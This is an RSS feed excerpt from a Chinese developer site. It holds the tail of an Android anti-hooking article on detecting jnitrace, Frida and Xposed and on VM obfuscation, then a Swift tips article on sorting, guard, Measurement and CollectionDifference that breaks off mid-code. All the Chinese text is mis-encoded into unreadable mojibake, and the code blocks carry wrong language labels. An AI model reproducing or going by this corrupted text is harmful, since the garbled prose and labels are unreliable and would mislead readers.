2ã€é€šè¿‡jnienvè·å–jniæ¥å£åœ°å€ï¼Œæ£€æµ‹jniæ¥å£å‡½æ•°æ˜¯å¦åœ¨libartèŒƒå›´å†…ï¼Œä»¥åŠjniå‡½æ•°å¼€å¤´æ˜¯å¦æ”¹å˜ï¼Œé˜²æŠ¤Jnitraceã€frida-traceã€xposedå®ç°çš„jnitraceã€‚</p>
</li>
<li>
<p>æŒ‡ä»¤traceé˜²æŠ¤
1ã€é‡‡ç”¨ DexVM ä¸å¹¶å¯¹è§£å¯†ç®—æ³• VM è¿›è¡ŒåµŒå¥—ï¼Œå°†æ ¸å¿ƒé€»è¾‘ä¸ç®—æ³•æ‰§è¡Œæµå®Œå…¨è™šæ‹ŸåŒ–ï¼Œä»è€Œæå‡ä»£ç æ··æ·†å¼ºåº¦å¹¶æŠµæŠ—ä¼ ç»ŸæŒ‡ä»¤çº§åˆ†æ,ç±»ä¼¼å¦‚ä¸‹å®ç°å³å¯é˜²æŠ¤é€šè¿‡æŒ‡ä»¤æ•°é‡æ¥å¿«é€Ÿå®šä½ä»£ç å—çš„æ–¹æ³•
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9eb816a89fd84c66904e8bb3563c85ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=N4myAmhvQV6HH%2F2IJOyiY5Yhpm8%3D" alt="" loading="lazy"/></p>
</li>
</ul>
<h3 data-id="heading-6">å‚è€ƒ</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.kanxue.com%2Fthread-288731.htm" target="_blank" title="https://bbs.kanxue.com/thread-288731.htm" ref="nofollow noopener noreferrer">bbs.kanxue.com/thread-2887â€¦</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.kanxue.com%2Fthread-270799.htm" target="_blank" title="https://bbs.kanxue.com/thread-270799.htm" ref="nofollow noopener noreferrer">bbs.kanxue.com/thread-2707â€¦</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.kanxue.com%2Fthread-285212.htm" target="_blank" title="https://bbs.kanxue.com/thread-285212.htm" ref="nofollow noopener noreferrer">bbs.kanxue.com/thread-2852â€¦</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FNiTianErXing666%2FSmallVmp" target="_blank" title="https://github.com/NiTianErXing666/SmallVmp" ref="nofollow noopener noreferrer">github.com/NiTianErXinâ€¦</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Ftheseventhson%2Fp%2F14933920.html" target="_blank" title="https://www.cnblogs.com/theseventhson/p/14933920.html" ref="nofollow noopener noreferrer">www.cnblogs.com/theseventhsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swiftä¸­çš„çŸ¥è¯†ç‚¹æ€»ç»“]]></title>    <link>https://juejin.cn/post/7582149417769140274</link>    <guid>https://juejin.cn/post/7582149417769140274</guid>    <pubDate>2025-12-11T06:58:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582149417769140274" data-draft-id="7582136489771204618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swiftä¸­çš„çŸ¥è¯†ç‚¹æ€»ç»“"/> <meta itemprop="keywords" content="Swift,iOS"/> <meta itemprop="datePublished" content="2025-12-11T06:58:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å´½å´½é•¿è‚‰è‚‰"/> <meta itemprop="url" content="https://juejin.cn/user/993614240687117"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swiftä¸­çš„çŸ¥è¯†ç‚¹æ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614240687117/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å´½å´½é•¿è‚‰è‚‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T06:58:16.000Z" title="Thu Dec 11 2025 06:58:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">1ã€å±æ€§åªæƒ³è®©å¤–ç•Œè®¿é—®ï¼Œè€Œä¸æƒ³è®©ä»–ä»¬ä¿®æ”¹</h4>
<p>// å±æ€§åªæƒ³è®©å¤–ç•Œè®¿é—®ï¼Œè€Œä¸æƒ³è®©ä»–ä»¬ä¿®æ”¹ï¼Œæ­¤æ—¶éœ€è¦ <code>public private(set) var name</code></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params"><span class="hljs-keyword">set</span></span>) <span class="hljs-keyword">var</span> name: String
</span></code></pre>
<h3 data-id="heading-1">2ã€æ™ºèƒ½æ’åºlocalizedStandardCompareçš„ç”¨æ³•</h3>
<p>æ¯”è¾ƒå¸¦æœ‰æ•°å­—çš„å­—ç¬¦ä¸²æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨<code>localizedStandardCompare</code>,é¿å…æŒ¨ä¸ªå­—ç¬¦æ¯”è¾ƒ</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">/*--------------- æ™ºèƒ½æ’åºlocalizedStandardCompareçš„ç”¨æ³• -------------------*/</span>
<span class="hljs-comment">// æ¯”è¾ƒå¸¦æœ‰æ•°å­—çš„å­—ç¬¦ä¸²æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨localizedStandardCompare,é¿å…æŒ¨ä¸ªå­—ç¬¦æ¯”è¾ƒ</span>
<span class="hljs-keyword">let</span> fileNames <span class="hljs-operator">=</span> [
 Â   <span class="hljs-string">"File 100.txt"</span>,
 Â   <span class="hljs-string">"File 5.txt"</span>,
 Â   <span class="hljs-string">"File 20.txt"</span>
]
â€‹
<span class="hljs-comment">// (1) æ•°ç»„æ’åº</span>
<span class="hljs-keyword">let</span> resultArr <span class="hljs-operator">=</span> fileNames.sorted {
 Â   <span class="hljs-variable">$0</span>.localizedStandardCompare(<span class="hljs-variable">$1</span>) <span class="hljs-operator">==</span> .orderedAscending
}
<span class="hljs-built_in">print</span>(resultArr)
â€‹
<span class="hljs-comment">// (2) æ’åº</span>
<span class="hljs-keyword">let</span> string1 <span class="hljs-operator">=</span> <span class="hljs-string">"File2.txt"</span>
<span class="hljs-keyword">let</span> string2 <span class="hljs-operator">=</span> <span class="hljs-string">"File10.txt"</span>
<span class="hljs-keyword">let</span> res <span class="hljs-operator">=</span> string1.localizedStandardCompare(string2)
<span class="hljs-keyword">switch</span> res {
<span class="hljs-keyword">case</span> .orderedAscending:
 Â   <span class="hljs-built_in">print</span>(<span class="hljs-string">"(string1) åœ¨ (string2) ä¹‹å‰"</span>)
<span class="hljs-keyword">case</span> .orderedDescending:
 Â   <span class="hljs-built_in">print</span>(<span class="hljs-string">"(string1) åœ¨ (string2) ä¹‹å"</span>)
<span class="hljs-keyword">case</span> .orderedSame:
 Â   <span class="hljs-built_in">print</span>(<span class="hljs-string">"(string1) åœ¨ (string2) ç›¸åŒ"</span>)
}
â€‹
<span class="hljs-comment">//ï¼ˆ3ï¼‰è‡ªå®šä¹‰ç±»å‹</span>
<span class="hljs-keyword">let</span> fileItem <span class="hljs-operator">=</span> [
 Â   <span class="hljs-type">FileItem</span>(name: <span class="hljs-string">"File2.txt"</span>, size: <span class="hljs-number">100</span>),
 Â   <span class="hljs-type">FileItem</span>(name: <span class="hljs-string">"File10.txt"</span>, size: <span class="hljs-number">200</span>),
 Â   <span class="hljs-type">FileItem</span>(name: <span class="hljs-string">"File1.txt"</span>, size: <span class="hljs-number">50</span>)
]
<span class="hljs-keyword">let</span> sortedItem <span class="hljs-operator">=</span> fileItem.sorted()
<span class="hljs-built_in">print</span>(sortedItem)
â€‹
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">FileItem</span>: <span class="hljs-title class_">Comparable</span> {
 Â   <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span>
 Â   <span class="hljs-keyword">let</span> size: <span class="hljs-type">Int</span>
 Â  Â 
 Â   <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">&lt;</span> (<span class="hljs-params">lhs</span>: <span class="hljs-type">FileItem</span>, <span class="hljs-params">rhs</span>: <span class="hljs-type">FileItem</span>) -&gt; <span class="hljs-type">Bool</span> {
 Â  Â  Â   <span class="hljs-keyword">return</span> lhs.name.localizedStandardCompare(rhs.name) <span class="hljs-operator">==</span> .orderedAscending
 Â   }
}
â€‹
<span class="hljs-comment">// æ–‡ä»¶ç®¡ç†</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FileManagerViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
 Â   <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> files: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
 Â   <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadFiles</span>() {
 Â  Â  Â   <span class="hljs-keyword">let</span> fileManager <span class="hljs-operator">=</span> <span class="hljs-type">FileManager</span>.default
 Â  Â  Â   <span class="hljs-keyword">let</span> documentsURL <span class="hljs-operator">=</span> fileManager.urls(for: .documentDirectory, in: .userDomainMask).first<span class="hljs-operator">!</span>
 Â  Â  Â  Â 
 Â  Â  Â   <span class="hljs-keyword">do</span> {
 Â  Â  Â  Â  Â   <span class="hljs-keyword">let</span> allFiles <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> fileManager.contentsOfDirectory(atPath: documentsURL.path)
 Â  Â  Â  Â  Â  Â 
 Â  Â  Â  Â  Â   <span class="hljs-comment">// æ™ºèƒ½æ’åº</span>
 Â  Â  Â  Â  Â   files <span class="hljs-operator">=</span> allFiles.sorted {
 Â  Â  Â  Â  Â  Â  Â   <span class="hljs-variable">$0</span>.localizedStandardCompare(<span class="hljs-variable">$1</span>) <span class="hljs-operator">==</span> .orderedAscending
 Â  Â  Â  Â  Â   }
 Â  Â  Â  Â  Â  Â 
 Â  Â  Â   } <span class="hljs-keyword">catch</span> {
 Â  Â  Â  Â  Â  Â 
 Â  Â  Â   }
 Â   }
}
</code></pre>
<h3 data-id="heading-2">3ã€èƒ½ç”¨guardçš„åœ°æ–¹å°½é‡ä½¿ç”¨guardï¼Œä¸è¦ä½¿ç”¨if letç»‘å®šè¯­æ³•</h3>
<p>è¿‡å¤šçš„if letä¼šé€ æˆä»£ç ç¼©è¿›ï¼Œå½¢æˆç±»ä¼¼åœ°ç‹±å¼å›è°ƒçš„ä»£ç ã€‚åŒæ—¶ä¹Ÿå½±å“äº†å¯è¯»æ€§ï¼Œä¼šå¾ˆéš¾åŒ¹é…å“ªä¸ªelseå¯¹åº”å“ªä¸ªif å¯ä»¥å¤šä½¿ç”¨guardè¯­æ³•ï¼Œguardä¼šå°†å˜é‡çš„ä½œç”¨åŸŸæå‡åˆ°top levelï¼Œä»è€Œæå‡å¯è¯»æ€§ï¼Œä¹Ÿèƒ½ä½¿é€»è¾‘å¤„ç†æ›´æ¸…æ™°</p>
<pre><code class="hljs language-javascript" lang="javascript">â€‹
func <span class="hljs-title function_">guardDemo</span>(<span class="hljs-params">name: <span class="hljs-built_in">String</span></span>) {
 Â   guard <span class="hljs-keyword">let</span> captureDevice = <span class="hljs-title class_">AVCaptureDevice</span>.<span class="hljs-title function_">default</span>(<span class="hljs-attr">for</span>: .<span class="hljs-property">video</span>) <span class="hljs-keyword">else</span> {
 Â  Â  Â   <span class="hljs-keyword">return</span>
 Â   }
 Â   <span class="hljs-comment">// è‡ªåŠ¨ç™½å¹³è¡¡</span>
 Â   <span class="hljs-keyword">if</span> captureDevice.<span class="hljs-title function_">isWhiteBalanceModeSupported</span>(<span class="hljs-params">.continuousAutoWhiteBalance</span>) {
 Â  Â  Â   <span class="hljs-keyword">do</span> {
 Â  Â  Â  Â  Â   <span class="hljs-keyword">try</span> captureDevice.<span class="hljs-title function_">lockForConfiguration</span>()
 Â  Â  Â  Â  Â   captureDevice.<span class="hljs-property">whiteBalanceMode</span> = .<span class="hljs-property">continuousAutoWhiteBalance</span>
 Â  Â  Â  Â  Â   captureDevice.<span class="hljs-title function_">unlockForConfiguration</span>()
 Â  Â  Â   } <span class="hljs-keyword">catch</span> {
â€‹
 Â  Â  Â   }
 Â   }
â€‹
 Â   <span class="hljs-comment">// è‡ªåŠ¨å¯¹ç„¦</span>
 Â   <span class="hljs-keyword">if</span> captureDevice.<span class="hljs-title function_">isFocusModeSupported</span>(<span class="hljs-params">.continuousAutoFocus</span>) {
 Â  Â  Â   <span class="hljs-keyword">do</span> {
 Â  Â  Â  Â  Â   <span class="hljs-keyword">try</span> captureDevice.<span class="hljs-title function_">lockForConfiguration</span>()
 Â  Â  Â  Â  Â   captureDevice.<span class="hljs-property">focusMode</span> = .<span class="hljs-property">continuousAutoFocus</span>
 Â  Â  Â  Â  Â   captureDevice.<span class="hljs-title function_">unlockForConfiguration</span>()
 Â  Â  Â   } <span class="hljs-keyword">catch</span> {
â€‹
 Â  Â  Â   }
 Â   }
â€‹
â€‹
 Â   <span class="hljs-comment">// è‡ªåŠ¨æ›å…‰</span>
 Â   <span class="hljs-keyword">if</span> captureDevice.<span class="hljs-title function_">isExposureModeSupported</span>(<span class="hljs-params">.continuousAutoExposure</span>) {
 Â  Â  Â   <span class="hljs-keyword">do</span> {
 Â  Â  Â  Â  Â   <span class="hljs-keyword">try</span> captureDevice.<span class="hljs-title function_">lockForConfiguration</span>()
 Â  Â  Â  Â  Â   captureDevice.<span class="hljs-property">exposureMode</span> = .<span class="hljs-property">continuousAutoExposure</span>
 Â  Â  Â  Â  Â   captureDevice.<span class="hljs-title function_">unlockForConfiguration</span>()
 Â  Â  Â   } <span class="hljs-keyword">catch</span> {}
 Â   }
}
</code></pre>
<h3 data-id="heading-3">4ã€Measurementå’ŒMeasurementFormatterçš„ç”¨æ³•</h3>
<p><code>Measurement</code>æ˜¯<code>swift</code>ä¸­ç”¨äºå¤„ç†ç‰©ç†æµ‹é‡çš„å¼ºå¤§ç±»å‹ï¼Œå®ƒç»“åˆäº†æ•°å€¼å’Œå•ä½ï¼Œæä¾›äº†ç±»å‹å®‰å…¨ã€å•ä½è½¬æ¢å’Œå›½é™…åŒ–çš„æ”¯æŒ</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-comment">// 1ã€åˆ›å»ºå¸¦æœ‰å•ä½çš„æµ‹é‡å€¼</span>
â€‹
let distance = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">100</span>, unit: UnitLength.meters)
â€‹
let temperature = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">20</span>, unit: UnitTemperature.celsius)
â€‹
let speed = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">60</span>, unit: UnitSpeed.kilometersPerHour)
â€‹
<span class="hljs-comment">// 2ã€é•¿åº¦å•ä½</span>
â€‹
let length = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">30</span>, unit: UnitLength.kilometers)
let miles = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">10</span>, unit: UnitLength.miles)
â€‹
let weitht = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">10</span>, unit: UnitMass.kilograms)
â€‹
 <span class="hljs-comment">// 3ã€ä¸åŒå•ä½è¿›è¡Œæ¢ç®—ï¼ˆè‡ªåŠ¨æ¢ç®—ï¼‰</span>
â€‹
let meters = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">1000</span>, unit: UnitLength.meters)
â€‹
let kilometers = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">1</span>, unit: UnitLength.kilometers)
â€‹
let totalLength = meters + kilometers <span class="hljs-comment">// 2000.0mï¼ˆkilometersè‡ªåŠ¨è½¬æ¢ä¸ºmï¼‰</span>
â€‹
<span class="hljs-comment">// 4ã€ä½¿ç”¨MeasurementFormatteræ ¼å¼åŒ–æ˜¾ç¤º</span>
â€‹
let formatter = <span class="hljs-built_in">MeasurementFormatter</span>()
â€‹
formatter<span class="hljs-selector-class">.unitOptions</span> = <span class="hljs-selector-class">.providedUnit</span>
â€‹
formatter<span class="hljs-selector-class">.unitStyle</span> = <span class="hljs-selector-class">.medium</span>
â€‹
let dis = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">5.2</span>, unit: UnitLength.kilometers)
<span class="hljs-built_in">print</span>(formatter.string(from: dis)) <span class="hljs-comment">// 5.2km</span>
â€‹
 <span class="hljs-comment">// æœ¬åœ°åŒ–æ˜¾ç¤º</span>
â€‹
formatter<span class="hljs-selector-class">.locale</span> = <span class="hljs-built_in">Locale</span>(identifier: "zh_CN")
â€‹
<span class="hljs-built_in">print</span>(formatter.string(from: dis)) <span class="hljs-comment">// 5.2å…¬é‡Œ</span>
â€‹
 <span class="hljs-comment">// æ¸©åº¦æ ¼å¼åŒ–</span>
â€‹
let tempFormatter = <span class="hljs-built_in">MeasurementFormatter</span>()
â€‹
tempFormatter<span class="hljs-selector-class">.numberFormatter</span><span class="hljs-selector-class">.maximumFractionDigits</span> = <span class="hljs-number">1</span>
â€‹
let temperae = <span class="hljs-built_in">Measurement</span>(value: <span class="hljs-number">23.5</span>, unit: UnitTemperature.celsius)
â€‹
<span class="hljs-built_in">print</span>(formatter.string(from: temperae)) <span class="hljs-comment">// 23.5Â°C</span>
â€‹
</code></pre>
<h4 data-id="heading-4">5ã€CollectionOfOneå’ŒCollectionDifferenceçš„ç”¨æ³•</h4>
<p><code>ColletionOfOne</code>æ˜¯ä¸€ä¸ªåªåŒ…å«å•ä¸ªå…ƒç´ çš„é›†åˆç±»å‹ï¼Œå®ç°äº†<code>Collection</code>åè®®</p>
<p><code>CollectionDifference</code>è¡¨ç¤ºä¸¤ä¸ªé›†åˆä¹‹é—´çš„å·®å¼‚</p>
<p>åœ¨Swiftä¸­ï¼Œ<code>applying</code>æ˜¯<code>CollectionDifference</code>çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒç”¨äºå°†ä¸€ä¸ªå·®å¼‚ï¼ˆdifferenceï¼‰åº”ç”¨åˆ°é›†åˆä¸Šä»è€Œç”Ÿæˆä¸€ä¸ªæ–°çš„é›†åˆã€‚è¿™ä¸ªæ–¹æ³•é€šå¸¸ç”¨äºæ›´æ–°ä¸€ä¸ªæ•°ç»„ï¼ˆæˆ–å…¶ä»–é›†åˆï¼‰ä»¥åæ˜ å¦ä¸€ä¸ªæ•°ç»„çš„çŠ¶æ€ï¼Œè€Œä¸éœ€è¦å®Œå…¨æ›¿æ¢ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">applying</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">difference</span>: <span class="hljs-type">CollectionDifference</span>&lt;<span class="hljs-type">Element</span>&gt;) -&gt; [<span class="hljs-type">Element</span>]<span class="hljs-operator">?</span>
â€‹
<span class="hljs-keyword">let</span> diffArr <span class="hljs-operator">=</span> newArray.difference(from: oldArray)
<span class="hljs-keyword">let</span> allArr <span class="hljs-operator">=</span> oldArray.applying(diffArr)
</code></pre>
<pre><code class="hljs language-scss" lang="scss">/----- ColletionOfOneæ˜¯ä¸€ä¸ªåªåŒ…å«å•ä¸ªå…ƒç´ çš„é›†åˆç±»å‹ï¼Œå®ç°äº†Collectionåè®®---------/
  let singleCollection = <span class="hljs-built_in">CollectionOfOne</span>(<span class="hljs-number">88</span>)
  <span class="hljs-built_in">print</span>(singleCollection.first!) <span class="hljs-comment">// 88</span>
  <span class="hljs-built_in">print</span>(singleCollection.count) <span class="hljs-comment">// 1</span>
â€‹
  /-------<span class="hljs-attr">--CollectionDifference</span>è¡¨ç¤ºä¸¤ä¸ªé›†åˆä¹‹é—´çš„å·®å¼‚-------------------------/
â€‹
  let oldArray = <span class="hljs-selector-attr">[<span class="hljs-string">"A"</span>,<span class="hljs-string">"B"</span>,<span class="hljs-string">"C"</span>,<span class="hljs-string">"D"</span>]</span>
  let newArray = <span class="hljs-selector-attr">[<span class="hljs-string">"A"</span>,<span class="hljs-string">"C"</span>,<span class="hljs-string">"D"</span>,<span class="hljs-string">"E"</span>]</span>;
â€‹
  let diffArr = newArray<span class="hljs-selector-class">.difference</span>(from: oldArray)
  let allArr = oldArray<span class="hljs-selector-class">.applying</span>(diffArr)
  <span class="hljs-built_in">print</span>("æœ€ç»ˆç»“æœï¼š(String(describing: allArr))") <span class="hljs-comment">// æœ€ç»ˆç»“æœï¼šOptional(["A", "C", "D", "E"])</span>
  for change in diffArr {
 Â   switch change {
 Â   case <span class="hljs-selector-class">.remove</span>(let offset,let element,let associatedWith):
 Â   // ç§»é™¤ï¼šç´¢å¼• <span class="hljs-number">1</span> å¤„çš„å…ƒç´  B associatedWith: -<span class="hljs-number">1</span>
 Â  Â   <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç§»é™¤ï¼šç´¢å¼• (offset) å¤„çš„å…ƒç´  (element) associatedWith: (associatedWith ?? -1)"</span>) 
 Â   case .<span class="hljs-built_in">insert</span>(let offset,let element,let associatedWith):
 Â   // æ’å…¥ï¼šç´¢å¼• <span class="hljs-number">3</span> å¤„çš„å…ƒç´  E associatedWith: -<span class="hljs-number">1</span>
 Â  Â   <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ’å…¥ï¼šç´¢å¼• (offset) å¤„çš„å…ƒç´  (element) associatedWith: (associatedWith ?? -1)"</span>)
 Â   }
  }
â€‹
let oldItems = <span class="hljs-selector-attr">[<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>, <span class="hljs-string">"d"</span>]</span>
let newItems = <span class="hljs-selector-attr">[<span class="hljs-string">"a"</span>, <span class="hljs-string">"c"</span>, <span class="hljs-string">"d"</span>, <span class="hljs-string">"e"</span>]</span>
let difference = newItems<span class="hljs-selector-class">.difference</span>(from: oldItems)
â€‹
tableView<span class="hljs-selector-class">.beginUpdates</span>()
for change in difference {
 Â   switch change {
 Â   case <span class="hljs-selector-class">.remove</span>(let offset, _, _):
 Â  Â  Â   tableView.<span class="hljs-built_in">deleteRows</span>(at: [<span class="hljs-built_in">IndexPath</span>(row: offset, section: <span class="hljs-number">0</span>)], with: .fade)
 Â   case .<span class="hljs-built_in">insert</span>(let offset, _, _):
 Â  Â  Â   tableView.<span class="hljs-built_in">insertRows</span>(at: [<span class="hljs-built_in">IndexPath</span>(row: offset, section: <span class="hljs-number">0</span>)], with: .fade)
 Â   }
}
tableView<span class="hljs-selector-class">.endUpdates</span>()
</code></pre>
<h3 data-id="heading-5">6ã€Swift ä¸­çš„ #error ç”¨æ³•è¯¦è§£</h3>
<p>#erroræ˜¯ä¸€ä¸ªç¼–è¯‘æ—¶æŒ‡ä»¤ï¼Œç”¨äºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ç”Ÿæˆé”™è¯¯ä¿¡æ¯å¹¶åœæ­¢ç¼–è¯‘</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// å¼ºåˆ¶è¦æ±‚æ¡ä»¶</span>
<span class="hljs-keyword">struct</span> API {
 Â   <span class="hljs-meta">#<span class="hljs-keyword">error</span>("è¯·è®¾ç½® API Key")</span>
 Â   <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> apiKey = <span class="hljs-string">""</span>
